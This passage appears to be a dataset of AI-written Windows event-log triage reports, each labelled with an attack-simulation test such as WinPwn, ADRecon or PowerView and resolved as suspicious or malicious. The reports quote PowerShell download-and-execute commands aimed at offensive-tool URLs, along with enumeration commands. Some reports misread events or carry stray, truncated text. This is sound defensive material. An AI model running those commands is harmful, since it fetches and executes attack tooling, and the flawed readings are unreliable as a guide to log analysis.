   - This behavior is often associated with reconnaissance activities to detect the presence of certain security tools and malware-related processes. While legitimate administrators might use similar commands under certain circumstances, it's generally a red flag when it's executed unexpectedly or from unknown users.

2. **System Logs:**
   - No irregularities related to process creation, system changes, or service activities that stand out as alarming. The time zone updates recorded are routine.

3. **Sysmon Logs:**
   - The logs show various system processes starting and stopping, mainly focusing on Microsoft Edge Update activities.
   - Notably, there is additional usage of PowerShell (as shown in the PowerShell logs) that aligns the timeline with suspicious activities.
   - Frequent execution of `conhost.exe` and `whoami.exe` could be considered as normal, but given the circumstances and associations with PowerShell usage, they could be part of a larger script or automated task.

4. **Security Logs:**
   - The logs do not show any failed logins or unauthorised access attempts. Time change events are consistent with what is seen in the system logs.

5. **Application Logs:**
   - Minimal logs showing service operations related to Microsoft Edge Update, which follow along with Sysmon process creation logs. These entries show service stopping, which can be routine when updates are checked or installed.

### Conclusion

The use of PowerShell to search for security product processes is suspicious and often indicative of malicious activity, such as attempts by malware to assess and circumvent security defenses. Given that no change or mitigation action is visible after these commands, the intent behind these commands is unclear, leaning toward the possibility of reconnaissance for malicious purposes.

### Resolution

**SUSPICIOUS** - The logs exhibit signs of suspect activities, particularly with the PowerShell commands. Further investigation is warranted:

1. **Immediate Actions:**
   - Confirm whether this action was performed by an authorized individual. Check for any scheduled tasks or scripts that might have run it.
   - Review system processes and user activities around the same timestamp for further context.

2. **Recommendations:**
   - Deploy additional monitoring for PowerShell activity.
   - Conduct endpoint scanning for potential unauthorized software or malware.
   - If unauthorized, consider isolating the affected machine to prevent potential spread or further data breaches.
   - Review access controls and perform a thorough audit on the systems and user activities, particularly those with elevated privileges.

These actions will help to confirm whether the activity stems from malicious intent or a legitimate but undocumented task."
List Google Chrome - Edge Chromium Bookmarks on Windows with command prompt,"Upon analyzing the provided Windows event logs, we can identify the following:

### Observations:
1. **Whoami and Hostname Executions (Event IDs 17945, 17976, 17980):**
   - Execution of `whoami.exe` and `hostname.exe` is often seen in administrative tasks to check user permissions and system status. These are legitimate commands; however, repeated or unusual execution by different users or processes, especially with high integrity levels, can indicate privilege enumeration or reconnaissance activity.

2. **Suspicious Command Execution (Event ID 17984):**
   - `cmd.exe` is executed with the command `where /R C:\Users\ Bookmarks`. The `where` command is used to locate files, potentially indicating a search for bookmark files. This might be part of a malicious actor's data exfiltration or information-gathering efforts.

3. **Multiple Edge Update Processes:**
   - Numerous `MicrosoftEdgeUpdate.exe` processes were executed (Event IDs 17987 to 18015). Edge updates are legitimate, but the sheer number being logged in such a short duration could indicate a misuse of scheduled tasks or update functionality to execute unauthorized tasks. Nonetheless, without additional context, they could also be normal automatic updates.

4. **Use of High Integrity-Level Process:**
   - Several processes, specifically `cmd.exe`, `where.exe`, and others, are running with high integrity levels, indicating administrative privilege usage, which is normal but should be verified against regular user activity patterns.

5. **System and Defender Update Processes (Event 3566, 3568):**
   - Regular updates for Microsoft Defender and the system are logged, showing responsible system maintenance actions.

6. **Time Change Events:**
   - Multiple time changes are logged (`EventID 3570, 3573`). It's typical operational behavior linked to time synchronization, possibly due to system time corrections via `time.windows.com`.

### Assessment:
- The consistent use of legitimate tools for administrative tasks like `whoami.exe`, `hostname.exe`, and `cmd.exe` with high integrity levels can be considered routine unless found with supporting evidence of misuse or patterns indicating compromise.
  
- The `cmd.exe /c where /R C:\Users\ Bookmarks` command is suspicious without context—often used in data-gathering to find specific files across directories. This requires closer scrutiny into the purpose and origin of this command.

- The Edge update processes, while potentially normal, reactiveness towards abnormal spikes or patterns in their execution is warranted to rule out misuse.

### Conclusion:
Based on the above rules and patterns derived from the log files:

- **Resolution: SUSPICIOUS**

  The investigation indicates some activities, specifically around command-line usage (`where` search command) and potentially exploitative use of update processes, which warrant further investigation. Immediate steps involve verifying the legit activity for these processes (cross-reference with expected user behavior and scheduled tasks) and scanning for potential system anomalies or security breaches.

### Guidance on How to Proceed:
1. **Investigate the Origin of Command Execution:**
   - Identify why there was a search for bookmarks and determine the parent process/user initiating these commands.

2. **Review User Activity Logs:**
   - Determine if commands align with legitimate user behavior or administrative tasks.

3. **Conduct a Malware Scan:**
   - Use updated antivirus or endpoint security solutions to search for any potential malware that might have triggered unconventional operations.

4. **Monitor Subsequent Behavior:**
   - Increase logging and monitoring for any recurring or similar suspicious activity by leveraging EDR solutions for anomaly detection.

5. **Assess Edge Update Patterns:**
   - Confirm that the Edge update activities align with expected update schedules and versions. 

Taking these actions will help in confirming whether the activities are benign or require remedial interventions."
Basic Permission Groups Discovery Windows (Local),"### Analysis

The provided logs contain several indications of potentially suspicious activities:

1. **Sysmon Logs**:
   - **Process Execution**: There's a sequence of events involving process executions from the `C:\Windows\System32\` directory and various EdgeUpdate-related processes. The execution of `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` is observed.
   - **Command Execution via `cmd.exe`**: An execution of the command-line `cmd.exe /c net localgroup & net localgroup ""Administrators""` is logged. This command retrieves information about local group memberships and potentially adds users to groups, which is commonly leveraged in privilege escalation or reconnaissance.

2. **Security Logs**:
   - **Event ID 4799**: This indicates a change in the membership of the 'Administrators' group initiated by the user `admin_test`. Any action involving administrative group membership changes warrants further scrutiny, particularly if initiated by non-privileged users.
   - **Event ID 4616**: Logged time changes are indicated but could be part of regular adjustments, though they can also help attackers cover their tracks by confusing log times.

3. **Application and System Logs**:
   - **Service Stoppage**: `edgeupdate` service stoppage is recorded. While a benign update process might cause such events, if not expected, service start/stop indicates a potential area for abuse.

### Assessment and Guidance

Based on the provided events, certain actions, such as the execution of the `cmd.exe` with direct querying or modifying local group memberships and the execution of administrative commands by a general user account, are suspicious. The sequence and frequency of elevated actions, especially involving process executions aiming at administrative tasks, tend to suggest an attempt at reconnaissance or unauthorized privilege change, possibly indicating an internal compromise or misuse by someone with elevated access within the system.

**Threat/Risks Identified**:
- Potential unauthorized local or domain privilege changes.
- Possible reconnaissance steps, indicative of an insider threat or initial stages of an external attack.

**Recommendation**:
- **Immediate Further Investigation**:
  - Validate whether the logged user actions were legitimate or expected (e.g., correlating activities with scheduled tasks or updates).
  - Conduct a thorough review of the user account `admin_test`, including recent activity and access logs for any anomalies.
  - Review similar activities on other critical systems to determine if this pattern recurs elsewhere.

- **Security Controls**:
  - Implement tighter monitoring on process executions and privilege changes, with specific alerts for known sensitive commands like `net localgroup`.
  - Confirm endpoint protection/EDR telemetry is working and investigate flagged alerts for suspicious activities or attempts at privilege escalation.

### Resolution: SUSPICIOUS

WinPwn - Powersploits privesc checks,"**Analysis of Windows Event Logs**

**Overview:**
The logs provided show activities from the Windows PowerShell, Sysmon, and Application channels. The most evident observation is the use of a PowerShell command to download a script from an external source, which can often be associated with malicious intentions.

**Suspicious Events:**
1. **PowerShell Events**: 
   - Multiple PowerShell events indicate the execution of scripts that downloaded content from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t`). Specifically, it seems to target a script file named `WinPwn.ps1`, which was executed with non-interactive and console output parameters.
   - The use of `iex(new-object net.webclient).downloadstring()` is typically associated with executing code directly from the internet, which is a red flag for malicious actions.

2. **Sysmon Logs**:
   - Several Sysmon entries show the process image `powershell.exe` executing the downloaded script, indicating scripted activity possibly intended for lateral movement or reconnaissance within the network.
   - The PowerShell process execution with high integrity level suggests this may have operated with elevated privileges, increasing the risk factor.
   - There are executions of system utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and others by the user `SERVER002\\admin_test` which could indicate a chain of actions typically following a system compromise.

3. **Application Events**:
   - An event from `edgeupdate` suggests typical service stops and starts but correlating with the system time, this could be window-dressing for other activities.

**Assessment:**
The logs show significant signs of compromise:
- The PowerShell activity is indicative of a potential attack vector, such as a phishing attempt that led to the execution of these scripts.
- The downloading and execution of a script from an external site is highly suspect and aligns with known tactics employed by attackers to establish foothold or explore the internal network.
- There are consistent high-integrity level activities, likely allowing unauthorized access across system utilities that could facilitate further malicious objectives.

**Resolution:**
- **MALICIOUS**: Given the nature and context of the PowerShell activities, the downloading of potentially dangerous scripts without user consent is a clear sign of malicious behavior. The technical footprint matches known compromise tactics.

**Recommendations:**
1. **Immediate Isolation**: Temporarily isolate the impacted system (Server002) to prevent further potential spread.
2. **Incident Response**: Initiate a full incident response to contain and remediate the compromise.
3. **Review and Block**: Disable any suspicious user accounts or privileges that were associated with the logs. Revoke local and network permissions where necessary.
4. **Threat Intelligence**: Investigate the downloaded script (`WinPwn.ps1`) in a secure environment to understand its intent and potential ramifications fully.
5. **Network Monitoring**: Enhance monitoring on network traffic related to the external source (`S3cur3Th1sSh1t`) and take precautionary measures against similar domains.
6. **Security Controls**: Ensure proper security configurations on PowerShell execution policies and implement more robust endpoint detection and network segmentation to minimize future risks."
WinPwn - itm4nprivesc,"Based on the provided event logs, here's a detailed analysis:

### Key Observations:
1. **Time Synchronization Events:**
   - There are several `Microsoft-Windows-Kernel-General` (EventID: 1, 24) logs related to system time changes. However, the time changes seem to be consistent with expected system behavior, likely due to time synchronization via `svchost.exe` using Windows Time Service (`time.windows.com`).

2. **Microsoft-Windows-Time-Service Log:**
   - The time synchronization with `time.windows.com` appears standard. EventID: 35 confirms this as part of normal operation.

3. **Security Logs - Time Change:**
   - `EventID: 4616` in the security logs indicates time changes executed by the `LOCAL SERVICE`. These logs match the expected behavior for time synchronization with no signs of tampering.

4. **Sysmon Log Analysis:**
   - A noteworthy activity is the execution of `powershell.exe` with a command line that includes downloading and executing a script from a GitHub repository (`https://github.com/S3cur3Th1sSh1t/WinPwn`). This indicates potential unauthorized or suspicious script execution.
   - Associated process paths (e.g., `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) and the use of `Webclient` to download scripts can be a sign of malicious activity, especially if it downloads known security tool scripts.

5. **Windows PowerShell Logs:**
   - Repeated entries of `PowerShell` (EventID: 600) with launch information show script execution with direct calls to download and run scripts. The use of `iex(new-object net.webclient).downloadstring(...)` often denotes script execution from the internet, potentially executing malicious actions.

6. **Application and System Logs:**
   - These logs mostly denote system service activities and Windows Defender operational states. Windows Defender is active as per logs (`EventID: 15`).

### Assessment:
- The behavior of running PowerShell with commands that download and execute scripts from an external source is highly suspicious and suggests potential compromise.
- Execution of the script `WinPwn.ps1` from the GitHub repository could indicate attempts at privilege escalation or other offensive security operations.
- The presence of high integrity level (`High`) in the Sysmon logs for these activities might suggest elevated execution potentially using administrative privileges.

Qakbot Recon,"Upon reviewing the provided logs, several key points of interest and potential indicators of malicious activity have been identified, particularly involving the CEO's machine:

### Key Findings:

1. **Credential Access Attempt Logs (Event ID 5379)**
   - Several failed attempts to retrieve credentials using the Microsoft Live/Account were logged, indicated by `ReturnCode` ""3221226021"". Continuous failed credential retrieves could be indicative of unauthorized access attempts or password-spraying techniques.

2. **Administrator Privilege Events (Event ID 4672)**
   - The user `admin_test` is reported with elevated privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. Elevated privileges are necessary for a variety of administrative tasks but, if abused, can also be a strong indicator of privilege escalation being exploited by a threat actor.

3. **Successful Logons (Event ID 4624)**
   - There are logon events for user `admin_test` coming from `LogonType 3`, which generally indicates network logons. The IP `192.168.0.102` is noted in one event. Verification of this IP against known company assets and locations may be prudent.

4. **Potential Malicious Batch File Execution**
   - A suspicious command line is seen: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\qakbot.bat""`. The `qakbot.bat` file suggests possible Qakbot malware, a known threat that commonly spreads via such scripts.

5. **System Commands Executed**
   - Several Windows system utilities like `net.exe`, `nslookup.exe`, `arp.exe`, `ipconfig.exe`, etc., have been executed in rapid succession. This behavior could suggest network reconnaissance activities typically associated with a compromised system executing commands within a script or by an attacker interacting with the system.

6. **Microsoft Edge Updates and Installations**
   - There are logs indicating installations and updates relating to Microsoft Edge, coming from a high-integrity level. It might be irrelevant to the compromise concern but should still be verified for authenticity due to its timing with the other events.

### Assessment

  - Ensure that all software and OS patches, particularly for Windows Defender and related security updates, are applied.

### Resolution
The log analysis points strongly to **MALICIOUS** activity.

Based on these findings, the incident should be escalated to incident response for thorough investigation and remediation procedures."
Automated AD Recon (ADRecon),"Upon analyzing the provided Windows event logs, the following activities stand out and require attention:

### Indicators of Potential Malicious Activity

1. **PowerShell Activity:**
   - The logs indicate the execution of a PowerShell script `ADRecon.ps1` from a temporary location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\ADRecon.ps1`). 
   - `ADRecon.ps1` is known to be a script used for active directory reconnaissance, which could be utilized by attackers for gathering sensitive information within an organization’s domain environment.
   - The usage of `Invoke-Expression` to execute scripts from temporary directories is commonly associated with suspicious activities as it suggests script execution without direct user input possibly hinting at automation or indirect execution methods used by adversaries.

2. **High Privilege and Anomalous Privilege Use:**
   - Multiple instances of Event ID 4672 indicate attempts to use special privileges by local `SYSTEM` (i.e., administrative) level accounts. These privileges include `SeDebugPrivilege` and `SeImpersonatePrivilege`, which are often leveraged by malware for persistence or privilege escalation.
   - Event ID 4798 queries on group membership checking for potentially privileged accounts `Administrator`, `admin_test`, `Guest`, suggests enumeration tactics potentially used for strategy planning by adversaries after gaining an initial foothold.

3. **Frequent Credential Access Failure (Event ID 5379):**
   - Numerous credential validation attempts resulted in failure with a return code of `3221226021`, indicating potential brute force attempts or unauthorized access trials.

4. **Suspicious Process Activity:**
   - The process `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and executions involving `conhost.exe` suggest reconnaissance-like activities. While they might also be benign utilities, the context of their execution (e.g., sequential timestamps, user performing them) matters.

 5. **Sysmon Entries:**
    - Consistent logging of process creation associated with these benign utilities might just indicate usage but when linked with tooling `ADRecon.ps1` could delineate normal operations from reconnaissance pre-attack techniques.

### Threat Assessment

Given the execution of a reconnaissance script, unauthorized credential access attempts, queries on group membership, and administrative level privileges:

  - **Potential Threat:** These activities fit the pattern of an early stage Advanced Persistent Threat (APT) or insider threat, aiming to gather information prior to further compromise.
  - **Risk:** If these activities are unrecognized by organizational security policies or not authorized by IT security teams, there may be a risk of unauthorized data exfiltration or network compromise.

### Recommended Actions

1. **Immediate Investigation:**
   - Verify if the execution of `ADRecon.ps1` is authorized or expected within your environment.
   - Review additional audit logs for any anomalies around the time of these events, especially focusing on network connections and registry modifications.
   - Cross-reference any login failures with legitimate access attempts to rule out brute-force attacks.

2. **Enhance Security Monitoring:**
   - Implement stricter logging on PowerShell execution, emphasizing script block logging and transcription for traceability.
   - Monitor and validate all use cases of administrative privileges and correlate these actions with user activity.

3. **Limit Exposure:**
   - Restrict execution policy for PowerShell to limit running scripts without an explicit signature from a trusted provider.
   - Ensure all critical systems have robust multi-factor authentication (MFA) mechanisms in place, especially for accounts with elevated privileges.

### Resolution

The assessment of the logs leads to a resolution of **SUSPICIOUS**. The activity does not definitively confirm a compromise but exhibits enough anomalies to warrant further thorough examination and monitoring to rule out malicious intent."
WinPwn - winPEAS,"## Detailed Analysis

### Suspicious and Anomalous Behavior

#### 1. PowerShell Activity with External Script Execution
The PowerShell logs revealed a series of events where the `powershell.exe` process was utilized to download and execute a script from the Internet, specifically from the URL ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"". This was executed using `iex(new-object net.webclient).downloadstring(...)`. This behavior is highly suspicious for the following reasons:
- **Script Download and Execution**: Downloading and executing a script directly from the Internet using PowerShell without any digital signature verification indicates potential compromise. 
- **Common Attack Technique**: This method is a typical attack vector used in executing malicious scripts for reconnaissance or further exploitation.

#### 2. Sysmon Logs Highlight Potential Reconnaissance
The Sysmon logs show the execution of several command-line utilities including `whoami.exe`, `hostname.exe`, and additional instances of `conhost.exe`. Such activities can be indicative of:
- **Reconnaissance**: Collecting user and system information to identify potential lateral movement opportunities or elevate privileges.

### Indicators of Compromise

- **WinPwn and winPEAS**: These are common tools used for post-exploitation activities and privilege escalation. The invocation of `winPEAS -noninteractive -consoleoutput` suggests a possible intention to escalate privileges or gather security-related information from the host.

### System and Application Logs
- No direct indication of compromise found in System and Application logs. The application logs mostly represent routine Microsoft Edge update activities, which seem benign by themselves but could have occurred alongside the suspicious PowerShell activity as a cover.

### Security Logs
- Time changes and adjustments are noted in the security logs. While changes in system time can occur for legitimate reasons like synchronizations, alongside the previously mentioned activities, this becomes an aspect worth noting, potentially trying to alter timestamps for obfuscation.

## Assessment of the Situation
Based on the analysis of the provided logs, the events particularly related to PowerShell indicate actions that are characteristic of malicious behavior. The direct execution of an external script via PowerShell, associated with known offensive tools like WinPwn and winPEAS, is a strong indicator of compromise.

## Resolution: **MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent any potential lateral movement by threat actors.
2. **Forensic Analysis**: Conduct a full forensic investigation of the affected system, focusing on PowerShell execution history and any downloaded scripts or files.
3. **Review and Remediate**: Check the integrity of accounts and privileges on the affected system. Modify any altered configurations and remove any unauthorized tools.
4. **System Audit**: Review audit logs and system changes for any additional signs of compromise across the network.
5. **Security Enhancements**: Implement measures such as:
   - Restricting PowerShell execution policies to only allow signed scripts.
   - Updating endpoint detection and response (EDR) mechanisms for better detection of command-line abuses.
   - Providing end-users with increased awareness and updates on incident response procedures.
6. **Comprehensive Monitoring**: Increase monitoring and scrutinize all network traffic and PowerShell activities across other systems within the environment."
System Service Discovery - net.exe,"Upon examining the provided Windows event logs, several observations and a detailed analysis can be extracted. Below is the analysis broken down by the log types and events of interest:

### Security Logs Analysis:

1. **Privilege Escalation**:
   - EventID 4672 indicates that the account `admin_test` gained several special privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, among others. This is notable as these privileges are usually associated with system-level control and potential privilege escalation.

2. **Logon Events**:
   - EventID 4624 details a successful logon for the user `admin_test` from a workstation `DESKTOP-3HL5B2P` using NTLM authentication. Logon type 3 indicates a network logon which might be typical in certain environments, but it should be cross-referenced with expected behavior.

3. **Repeated Credential Read Failures**:
   - Multiple instances of EventID 5379 indicate failed attempts to read credentials (ReturnCode `3221226021` suggests unsuccessful operations) for `MicrosoftAccount:user=02txoixylodcstop`. Such repeated failures can indicate attempts to access credential manager secrets, suggesting potential credential theft or probing activity.

### Sysmon Logs Analysis:

1. **Uncommon Process Execution**:
   - Processes such as `wevtutil.exe` and `cmd.exe` are seen executing alongside console hosts (`conhost.exe`), which might be benign but in the context of privilege usage and NTLM network logon could suggest command line operations and event log manipulations.

2. **Process Tree and Command Line**:
   - The logs show `cmd.exe` executing the command to list services redirecting output to a file, which might be an attempt to enumerate services running on the system from an unauthorized remote session.

3. **Tool Execution**:
   - The execution of `hostname.exe` and `whoami.exe` under `admin_test` context running from the user's Documents directory isn't immediately suspicious but can be indicative of discovery actions by an attacker.

4. **Kernel and Software Updates**:
   - The execution of Microsoft Edge updates and Windows updates like `wuauclt.exe`, `MpSigStub.exe`, and `AM_Delta.exe` seem to be legitimate software updates as seen from their context and timing with Windows Update Client logs.

### Conclusion:

- **Indicators of Potential Malicious Activity**:
  - The elevation of privileges to a wide combination of powerful privileges (`SeDebugPrivilege`, etc.).
  - Multiple credential read attempts (EventID 5379) and network logons using NTLM from an unspecified workstation (`DESKTOP-3HL5B2P`).

- **Legitimate Operations**:
  - Software updates for Microsoft products appear routine and not suspicious in isolation.

### Risk Assessment and Resolution: **SUSPICIOUS**

The activity surrounding the `admin_test` user, particularly the combination of powerful privilege usage, and network-based logon with NTLM authentication, along with attempted credential reads, warrant further attention. The activities may correspond to lateral movement or reconnaissance efforts within the network. However, due to legitimate-looking updates and tool usage, the context isn't definitively malicious without further information.

### Recommendations:

1. **Immediate Steps**:
   - Verify the legitimacy of network logons and privilege assignments for `admin_test`. Cross-reference with known user activity.
   - Review logs for the system `DESKTOP-3HL5B2P` to identify potentially unauthorised access points or sessions.
   - Inspect systems for unauthorized changes, especially any privilege misuse or unauthorised credential access.

2. **Proactive Measures**:
   - Enhance monitoring of high privilege accounts and use of NTLM throughout the network.
   - Consider enforcing stricter authentication methods and disabling NTLM where unnecessary.
   - Conduct regular reviews and limit powerful privileges to essential service accounts only.

Given the findings, these actions can help mitigate risks while confirming or refuting the presence of genuine threats."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"After analyzing the provided log entries from multiple logs (Security, Application, Sysmon, and Windows PowerShell), several activities stand out:

1. **Repeated Logon Events with High Privileges:**
   - Numerous Event IDs 4624 (An account was successfully logged on) followed by Event ID 4672 (Special privileges assigned to new logon) occur within a short time frame. These logs show logon attempts via process `C:\Windows\System32\services.exe` and assignment of several high privileges, including SeDebugPrivilege, which could be potentially suspicious.

2. **Repeated Credential Access Failures:**
   - Multiple Event ID 5379 entries indicate attempts to access credentials associated with Microsoft accounts and Windows Live tokens and certificates, all failing with ReturnCode 3221226021. These repeated failed attempts to retrieve credentials could indicate reconnaissance or attempted unauthorized access.

3. **Execution of PowerShell Scripts:**
   - Sysmon logs (Event ID 1) indicate the execution of PowerShell scripts, such as the `Get-ADUser` command for retrieving account information (user account control). While usage of PowerShell is common for administration, it is a tool also often leveraged by attackers for lateral movement and data extraction.

4. **Taskhostw.exe Invocations:**
   - The `C:\Windows\System32\taskhostw.exe` process appears alongside Event ID 4798 entries which suggest enumeration of user accounts like Administrator, admin_test, and Guest.

5. **Other Sysmon Logs:**
   - The Sysmon logs are heavily populated with entries related to Microsoft Edge Update processes, which appear benign and are part of the Microsoft Edge update routine. 
   - Other typical Windows processes are seen starting and stopping, consistent with regular system maintenance and updates (e.g., `CompatTelRunner.exe`, `MusNotification.exe`, `sc.exe`).

**Assessment and Recommendation:**

The observed behavior raises some red flags, notably the failed attempts to access credentials, the potential abuse of privileges, and the enumeration activities. While the privileged logins could be part of scheduled tasks or services, the combination of these activities warrants closer inspection.

Final Assessment: **SUSPICIOUS**

- **Actionable Steps:**
  - Investigate the root cause of the repeated credential access failures and verify whether these accounts should be accessed.
  - Confirm the legitimacy of the processes that require high privileges, especially those initiating from `services.exe`.
  - Review the scripts executed via PowerShell and ascertain if they are typical for server management or potentially malicious.
  - Monitor network logs for any unusual outbound connections that might correlate to this timeframe.
  - Enhance monitoring around the CEO's machine and related user accounts, specifically looking for any unauthorized access attempts or privilege escalations.
  
Further investigation is needed to rule out any potential threat or compromise. If any unknown activities are confirmed, escalate for an incident response."
Device Driver Discovery,"After analyzing the provided Windows event logs, here is a detailed breakdown of the activity and an assessment:

### Logs Analysis:

1. **Process Execution and Command-line Analysis:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` running, initiated by `SERVER002\admin_test`. These processes are legitimate Windows processes, often used for managing event logs and console windows.
   - The command line for PowerShell seems focused on querying system drivers: `driverquery /v /fo list, driverquery /si /fo list`. This command is generally used for auditing drivers and is not inherently malicious. However, its origin and reason should be understood better, especially since it's executed with high integrity level by an admin user.

2. **Privilege Escalation Indicators:**
   - The `admin_test` user possessed high-level privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.). While administrators typically have such privileges, it’s crucial to verify if the user was intending to carry out such actions.

3. **Time Discrepancies:**
   - The system time appears to have been adjusted by a process running under the `svchost.exe`, associated with `LOCAL SERVICE`. This could be part of normal NTP time synchronization unless identified with suspicious modification patterns.

4. **Network and Logon Events:**
   - The logs show a successful logon via NTLM for the `admin_test` user from a remote device (`192.168.0.102`). The logon type is `3`, which indicates a network logon. Ensure that this IP is recognized and authorized for remote sign-ins.

5. **Microsoft Edge Updates:**
   - Numerous processes and executions relate to `Microsoft Edge Update` services (`MicrosoftEdgeUpdate.exe`), which are common for application updates orchestrated by Microsoft. All these updates occur under `NT AUTHORITY\SYSTEM`, which is normal.

### Assessment:

- **Unusual actions**: The PowerShell command execution and querying drivers are typically used in defensive or forensic activities. While there is nothing directly malicious, if these were unexpected or unauthorized actions by `admin_test`, they are worth investigating for legitimacy.
- **Time adjustments** should be verified to ensure they result from routine time synchronization rather than an attempt to manipulate logs or timestamps maliciously.

### Conclusion and Recommendations:

- **Resolution: SUSPICIOUS**
  - Although no explicit malicious activity is detected, the executed PowerShell commands and privilege usage justify further inquiry to rule out any unauthorized or malicious behavior.
  - **Recommendations**:
    - Verify with the user `admin_test` or the responsible team if the driver queries and PowerShell activities were intentional.
    - Confirm the legitimacy of the remote logon and ensure the accessed IP is recognized and not a sign of illicit access.
    - Review system time modification logs for assurance it aligns with expected NTP corrections.
    - Monitor any future activities on this host closely for similar patterns and ensure endpoint defenses are up to date. 

Given the logs' context, continued monitoring and assessment of associated users and processes are essential to ensure no escalation to malicious activity occurs."
WinPwn - MS17-10,"Based on the provided log entries, I have analyzed the activity for indicators of potential malicious activity or compromise. Here’s a detailed analysis:

**System Logs:**
- The system logs show time changes being executed by `svchost.exe` which is a typical behavior to log time drift corrections, generally benign unless seen alongside other suspicious activities.

**Windows PowerShell Logs:**
- The PowerShell logs present highly suspicious behavior. An attempt to execute a PowerShell command to download and execute a script from a GitHub repository (`WinPwn.ps1`) indicates potential malicious activity. This script is known for exploiting MS17-10 (EternalBlue), a well-known vulnerability. This is a significant indicator of potentially malicious actions taking place on the system.

**Security Logs:**
- There is evidence of a user (`admin_test`) initiating a session with a set of privileges that include `SeDebugPrivilege` and `SeImpersonatePrivilege`, which are known to be sensitive and might be used for lateral movement or privilege escalation within a network.

**Application Logs:**
- Show Windows Defender being active, but there is no evidence of it blocking or flagging the detected PowerShell activity, which could imply that Defender has been bypassed or is misconfigured.

**Sysmon Logs:**
- Multiple process creations associated with sysadmin-level users are observed, including executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. Of particular note is the PowerShell execution with a command line that correlates to the same suspicious behavior seen in the PowerShell logs, indicating an attempt to execute potentially malicious scripts.

**Assessment:**
- The combined evidence of suspicious PowerShell script execution attempts, potentially inappropriate use of administrative privileges, and concealment or bypassing of security measures strongly suggest a compromise or attack in progress utilizing known vulnerability exploits.

**Resolution: MALICIOUS**
- Guidance on how to proceed includes: 
  - Immediate isolation of the host from the network to prevent further spread or data exfiltration.
  - Conduct a detailed forensic investigation to understand the full scope of the compromise.
  - Reset credentials for affected user accounts especially those seen interacting in the logs.
  - Review and possibly rebuild the affected system from a known good state if evidence of compromise is validated.
  - Strengthen defenses by ensuring patches for known vulnerabilities are up-to-date, like MS17-10, and review security configurations to ensure no privilege misuse or unintended access permissions."
Port Scan NMap for Windows,"Upon reviewing the provided Windows event logs from Server002, several events stand out as potentially suspicious or indicative of malicious activity. Here is a detailed analysis:

1. **Privileged Actions and Service Installations:**
   - Multiple logs indicate the installation and execution of Npcap and Microsoft Visual C++ Redistributable files, which are not inherently malicious but can be used for network scanning or used maliciously in certain contexts.
   - Events show the use of ""Npcap Packet Driver"" installed with system privileges, which could be leveraged for sniffing network traffic or other covert operations.

2. **PowerShell Use:**
   - Windows PowerShell logs indicate the execution of commands such as `nmap 127.0.0.1`. The use of PowerShell to call `nmap`, a network scanning tool, suggests possible network reconnaissance activities.
   - The presence of PowerShell events like HostApplication entries aggregating nmap commands is unusual for standard operations.

3. **CertUtil Usage:**
   - CertUtil is a Windows utility program that can be used to download files from the internet outside of traditional web browsers or file transfer methods. The logs display CertUtil used to add certificates, an action that is often exploited to introduce trusted root certificates to manipulate system-wide trust settings.

4. **Scheduled Tasks Creation:**
   - The Sysmon logs include the creation of a scheduled task named ""npcapwatchdog"" set to run on system startup. While this could be benign, it could also indicate persistence mechanisms being established for unauthorized software.

5. **Registry Modification:**
   - Steps involving `regedit.exe` and `regedt32.exe` to modify the registry via external script or reg file can alter configurations or implant malicious persistence methods in the system registry.

6. **Installation of External Software:**
   - The logs also depict the establishment of Npcap and Microsoft Visual C++ Redistributable files, often needed for running certain applications, but could be used by attackers for setting up dependencies needed by malicious tools like network analyzers or attack frameworks.

**Assessment:**
Based on the analysis, the activities observed within the logs indicate an unusual pattern of operations. These can accompany a system where network reconnaissance is being conducted possibly with intentions to exploit further or eavesdrop on communications. Components like `nmap`, `powershell`, and `certutil` are being used in a manner consistent with malicious intent to investigate network topologies and adjust trust settings within a Windows environment.

**Recommendation:**
- Immediate escalation for a deeper forensic investigation is advised to verify the presence of unauthorized users or threats in the system.
- Investigate alerts from Endpoint Detection and Response (EDR) solutions triggered for the activity to ascertain risk levels.
- Conduct a thorough review of users with access to the system and identify any unauthorized changes.
- Consider network isolation for the examined host until the investigation concludes ensuring no exfiltration or further ingress can occur.
- Log findings and remediation steps for audit compliance and threat actor intelligence purposes.

**Resolution:**
- **SUSPICIOUS** - The logs reveal activities that do not align with benign operations and raise concerns necessitating further investigations to ascertain their legitimacy or malicious intent."
Get-DomainGPO to display group policy information via PowerView,"Based on the analysis of the provided logs, the following observations have been made:

### 1. PowerShell Log Analysis:
- There are multiple PowerShell logs indicating execution with the command line argument `-nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/.../powerview.ps1'); Get-DomainGPO""`.
  - **Indicators**:
    - The use of `-nop` (no profile) and `-exec bypass` (execution policy bypass) flags is suspicious.
    - The `IEX` (Invoke-Expression) with `New-Object Net.WebClient).DownloadString(...)` is used to download and execute a script from a URL, which is a common technique for remote code execution.
    - The URL linked is associated with BC Security's Empire framework, commonly used for post-exploitation activities.

### 2. Sysmon Log Analysis:
- Multiple process creations related to `powershell.exe` with similar suspicious command lines as seen in the PowerShell logs.
- Entry of processes such as `whoami.exe` and `hostname.exe` shortly following the PowerShell executions, potentially indicative of lateral reconnaissance actions (gathering user and machine information).
  
### 3. Application Log Analysis:
- Normal Windows updates and services seen in the log entries (`MicrosoftEdgeUpdate`). No apparent malicious activities from application logs alone but should be viewed in context with suspicious PowerShell usage.

### 4. Security Log Analysis:
- Time change events within the system, however, no direct correlation to the PowerShell execution.
